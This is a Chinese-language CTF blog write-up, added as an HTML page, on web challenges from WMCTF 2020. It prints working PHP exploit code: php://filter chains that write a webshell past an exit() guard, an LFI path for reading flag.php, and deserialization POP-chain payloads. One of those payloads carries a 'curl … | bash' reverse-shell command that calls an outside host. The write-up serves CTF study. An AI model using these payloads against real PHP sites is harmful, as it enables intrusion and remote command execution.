@@ -1,0 +1,647 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>wmctf复现 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="wmctf复现">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-08-04 18:14" pubdate>
+        2020年8月4日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      19
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">wmctf复现</h1>
+            
+            <div class="markdown-body">
+              <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="web-checkin"><a href="#web-checkin" class="headerlink" title="web_checkin"></a>web_checkin</h2><p>直接传/flag,然后非预期上了 web_checkin2</p>
+<p>还可以利用LFI + php7崩溃</p>
+<p> <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5535#toc-7">https://xz.aliyun.com/t/5535#toc-7</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/dfd049924258">https://www.jianshu.com/p/dfd049924258</a></p>
+<p>还可以直接用伪协议</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-comment">/*/*$a = urldecode(&#x27;php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[sky]);?&gt;/resource=123.php&#x27;);*/</span>
+<span class="hljs-comment">//$a = urldecode(&quot;php://filter/string.strip_tags|zlib.inflate|%3F%3E%b3%b1%2f%c8%28%50%28%ae%2c%2e%49%cd%d5%50%89%77%77%0d%89%8e%8f%d5%b4%b6%b7%03%3C%3F/resource=123.php&quot;);</span>
+<span class="hljs-comment">//file_put_contents($a,&quot;<span class="hljs-meta">&lt;?php</span> exit();&quot;.$a);</span>
+
+
+
+
+<span class="hljs-comment"># 生成zlib.inflate能解压的东西</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">strToHex</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;
+    <span class="hljs-variable">$hex</span>=<span class="hljs-string">&quot;&quot;</span>;
+    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;strlen(<span class="hljs-variable">$str</span>)<span class="hljs-number">-1</span>;<span class="hljs-variable">$i</span>++) &#123;
+        <span class="hljs-variable">$len</span> = strlen(dechex(ord(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>])));
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$len</span> === <span class="hljs-number">1</span>) &#123;
+            <span class="hljs-variable">$hex</span> = <span class="hljs-variable">$hex</span> . <span class="hljs-string">&quot;%0&quot;</span> . dechex(ord(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>]));
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-variable">$hex</span> = <span class="hljs-variable">$hex</span> . <span class="hljs-string">&quot;%&quot;</span> . dechex(ord(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>]));
+        &#125;
+    &#125;
+    <span class="hljs-keyword">return</span> <span class="hljs-variable">$hex</span>;
+&#125;
+
+<span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;php://filter/zlib.deflate/resource=123.php&quot;</span>;
+file_put_contents(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;&lt;?php system($_GET[_]);?&gt;&#x27;</span>);
+<span class="hljs-variable">$handle</span> = file_get_contents(<span class="hljs-string">&quot;123.php&quot;</span>);
+<span class="hljs-keyword">echo</span> var_dump(strToHex(<span class="hljs-variable">$handle</span>));
+<span class="hljs-comment"># 要在前后加上?&gt;&lt;?去掉多余的东西</span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202510">https://www.anquanke.com/post/id/202510</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF%202020%E5%AE%98%E6%96%B9WriteUp.md">https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF%202020%E5%AE%98%E6%96%B9WriteUp.md</a></p>
+<p>再或者先压缩再解压</p>
+<p>预留了zlib、bzip2、string等过滤器， <code>php:filter</code> 支持使用多个过滤器，所以可以利用 <code>zlib</code> 的 <code>zlib.deflate</code> 和 <code>zlib.inflate</code> 来做，压缩后再解压后内容肯定不变，不过我们可以在中间遍历一下剩下的几个过滤器，看看中间操作时候会影响后续inflate的内容，简单遍历一下可以发现中间插入string.tolower转后会把空格和exit处理了就可以绕过exit👇</p>
+<pre><code class="hljs php">php:<span class="hljs-comment">//filter/zlib.deflate|string.tolower|zlib.inflate|<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span>%0deval($_GET[1]);<span class="hljs-meta">?&gt;</span>/resource=Cyc1e.php </span></code></pre>
+
+
+
+<p>第三种解法可以用url编码，file_put_contents中可以调用伪协议，而伪协议处理时会对过滤器urldecode一次，所以是可以利用二次编码绕过的。</p>
+<pre><code class="hljs livecodeserver">php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">write</span>=<span class="hljs-keyword">string</span>.rot13|<span class="hljs-meta">&lt;?</span>cuc riny(<span class="hljs-variable">$_CBFG</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span>|/resource=Cyc1e.php</code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/">https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/</a></p>
+<h2 id="Make-PHP-Great-Again"><a href="#Make-PHP-Great-Again" class="headerlink" title="Make PHP Great Again"></a>Make PHP Great Again</h2><p>非预期可以 session + lfi getshell 包shell</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5535#toc-7">https://xz.aliyun.com/t/5535#toc-7</a></p>
+<p>然后也上了2</p>
+<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>v2222.no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/?
+file=php:<span class="hljs-regexp">//</span>filter/read=convert.base64-
+encode<span class="hljs-regexp">/resource=compress.zlib:/</span><span class="hljs-regexp">/file:/</span><span class="hljs-regexp">//</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>
+root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>
+proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>
+self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>
+root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>
+proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>
+self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php</code></pre>
+
+
+
+<h2 id="webweb"><a href="#webweb" class="headerlink" title="webweb"></a>webweb</h2><p>搞不来，先把exp拿出来然后再分析下，太难了 qwq</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">DB</span>\<span class="hljs-title">SQL</span> &#123;
+    <span class="hljs-title">class</span> <span class="hljs-title">Mapper</span> &#123;
+        <span class="hljs-title">protected</span>$<span class="hljs-title">props</span>;
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$props</span></span>)</span>
+<span class="hljs-function">        </span>&#123;
+            <span class="hljs-keyword">$this</span>-&gt;props=<span class="hljs-variable">$props</span>;
+        &#125;
+    &#125;
+&#125;
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">CLI</span> &#123;
+
+    <span class="hljs-title">class</span> <span class="hljs-title">Agent</span>&#123;
+        <span class="hljs-title">protected</span>$<span class="hljs-title">server</span>;
+        <span class="hljs-keyword">protected</span><span class="hljs-variable">$socket</span>;
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$server</span></span>)</span>
+<span class="hljs-function">        </span>&#123;
+            <span class="hljs-keyword">$this</span>-&gt;server=<span class="hljs-variable">$server</span>;
+            <span class="hljs-keyword">$this</span>-&gt;socket=<span class="hljs-string">&#x27;dir&#x27;</span>;
+        &#125;
+
+    &#125;
+
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WS</span></span>&#123;
+        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$events</span>= [];
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$events</span></span>)</span>
+<span class="hljs-function">        </span>&#123;
+            <span class="hljs-keyword">$this</span>-&gt;events=<span class="hljs-variable">$events</span>;
+        &#125;
+    &#125;
+&#125;
+
+
+<span class="hljs-keyword">namespace</span> &#123;
+
+    <span class="hljs-title">use</span> <span class="hljs-title">CLI</span>\<span class="hljs-title">Agent</span>;
+    <span class="hljs-keyword">use</span> <span class="hljs-title">CLI</span>\<span class="hljs-title">WS</span>;
+
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Basket</span></span>&#123;
+        <span class="hljs-keyword">public</span> <span class="hljs-variable">$events</span>= [];
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$events</span></span>)</span>
+<span class="hljs-function">        </span>&#123;
+            <span class="hljs-keyword">$this</span>-&gt;events=<span class="hljs-variable">$events</span>;
+        &#125;
+    &#125;
+
+    <span class="hljs-variable">$a0</span>=<span class="hljs-keyword">new</span> \DB\SQL\Mapper(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;read&quot;</span>=&gt;<span class="hljs-string">&quot;system&quot;</span>));
+    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Agent(<span class="hljs-variable">$a0</span>);
+
+    <span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> Basket(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;disconnect&quot;</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;fetch&#x27;</span>)));
+
+    <span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> Agent(<span class="hljs-variable">$b</span>);
+
+    <span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> WS(<span class="hljs-variable">$c</span>);
+    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$d</span>)).<span class="hljs-string">&quot;\n&quot;</span>;
+&#125;</code></pre>
+
+<p>难受</p>
+<p>补充，这题用了两个trick</p>
+<ol>
+<li><pre><code>&lt;?php
+class flag&#123;
+    function here()&#123;
+        echo &quot;good&quot;;
+    &#125;
+&#125;
+
+</code></pre>
+</li>
+</ol>
+<p>   $cs = array(new flag(),”here”);<br>   $cs();`<br>   <pre><code class="hljs reasonml">
+<span class="hljs-number">2.</span> ```
+   <span class="hljs-built_in">array</span>(<span class="hljs-keyword">new</span> CLI\<span class="hljs-constructor">WS()</span>,<span class="hljs-keyword">new</span> CLI\<span class="hljs-constructor">Agent()</span>)</code></pre></p>
+<p>   直接传Agent类会去找Agent.php，而这里没有，所以为了解决找不到可以反序列话一个数组过去。</p>
+<p>   也可以套娃像上面那个payload一样</p>
+<p>exp</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">CLI</span>&#123; 
+    <span class="hljs-title">class</span> <span class="hljs-title">Agent</span> 
+    &#123; 
+        <span class="hljs-title">protected</span> $<span class="hljs-title">server</span>; 
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$server</span></span>) </span>
+<span class="hljs-function">        </span>&#123; 
+            <span class="hljs-keyword">$this</span>-&gt;server=<span class="hljs-variable">$server</span>; 
+        &#125; 
+    &#125; 
+
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WS</span> </span>
+<span class="hljs-class">    </span>&#123; 
+    &#125; 
+&#125; 
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">DB</span>&#123; 
+    <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">Cursor</span>  <span class="hljs-title">implements</span> \<span class="hljs-title">IteratorAggregate</span> &#123;&#125; 
+    <span class="hljs-title">class</span> <span class="hljs-title">Mongo</span> &#123; 
+        <span class="hljs-title">public</span> $<span class="hljs-title">events</span>; 
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$events</span></span>) </span>
+<span class="hljs-function">        </span>&#123; 
+            <span class="hljs-keyword">$this</span>-&gt;events=<span class="hljs-variable">$events</span>; 
+        &#125; 
+    &#125; 
+&#125; 
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">DB</span>\<span class="hljs-title">Mongo</span>&#123; 
+    <span class="hljs-title">class</span> <span class="hljs-title">Mapper</span> <span class="hljs-title">extends</span> \<span class="hljs-title">DB</span>\<span class="hljs-title">Cursor</span> &#123; 
+        <span class="hljs-title">protected</span> $<span class="hljs-title">legacy</span>=0; 
+        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$collection</span>; 
+        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$document</span>; 
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">offsetExists</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span></span>)</span>&#123;&#125; 
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">offsetGet</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span></span>)</span>&#123;&#125; 
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">offsetSet</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span>, <span class="hljs-variable">$value</span></span>)</span>&#123;&#125; 
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">offsetUnset</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span></span>)</span>&#123;&#125; 
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getIterator</span>(<span class="hljs-params"></span>)</span>&#123;&#125;     
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$collection</span>,<span class="hljs-variable">$document</span></span>)</span>&#123; 
+            <span class="hljs-keyword">$this</span>-&gt;collection=<span class="hljs-variable">$collection</span>; 
+            <span class="hljs-keyword">$this</span>-&gt;document=<span class="hljs-variable">$document</span>; 
+        &#125; 
+    &#125; 
+&#125; 
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">DB</span>\<span class="hljs-title">SQL</span>&#123; 
+    <span class="hljs-title">class</span> <span class="hljs-title">Mapper</span> <span class="hljs-title">extends</span> \<span class="hljs-title">DB</span>\<span class="hljs-title">Cursor</span>&#123; 
+        <span class="hljs-title">protected</span> $<span class="hljs-title">props</span>=[&quot;<span class="hljs-title">insertone</span>&quot;=&gt;&quot;<span class="hljs-title">system</span>&quot;]; 
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">offsetExists</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span></span>)</span>&#123;&#125; 
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">offsetGet</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span></span>)</span>&#123;&#125; 
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">offsetSet</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span>, <span class="hljs-variable">$value</span></span>)</span>&#123;&#125; 
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">offsetUnset</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span></span>)</span>&#123;&#125; 
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getIterator</span>(<span class="hljs-params"></span>)</span>&#123;&#125;    
+    &#125; 
+&#125; 
+
+<span class="hljs-keyword">namespace</span>&#123; 
+$<span class="hljs-title">SQLMapper</span>=<span class="hljs-title">new</span> <span class="hljs-title">DB</span>\<span class="hljs-title">SQL</span>\<span class="hljs-title">Mapper</span>(); 
+<span class="hljs-variable">$MongoMapper</span>=<span class="hljs-keyword">new</span> DB\Mongo\Mapper(<span class="hljs-variable">$SQLMapper</span>,<span class="hljs-string">&quot;curl https://shell.now.sh/39.106.207.66:2333 |bash&quot;</span>); 
+<span class="hljs-variable">$DBMongo</span>=<span class="hljs-keyword">new</span> DB\Mongo(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;disconnect&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-variable">$MongoMapper</span>,<span class="hljs-string">&quot;insert&quot;</span>))); 
+<span class="hljs-variable">$Agent</span>=<span class="hljs-keyword">new</span> CLI\Agent(<span class="hljs-variable">$DBMongo</span>); 
+<span class="hljs-variable">$WS</span>=<span class="hljs-keyword">new</span> CLI\WS(); 
+<span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$WS</span>,<span class="hljs-variable">$Agent</span>))); 
+&#125;</code></pre>
+
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/WMCTF/">WMCTF</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/08/06/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day1-Web2-Homebrew-Dubbo/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">[CISCN2019 总决赛 Day1 Web2]Homebrew Dubbo</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/07/31/ctfshow-WEB-AK%E8%B5%9B/">
+                        <span class="hidden-mobile">ctfshow WEB_AK赛</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
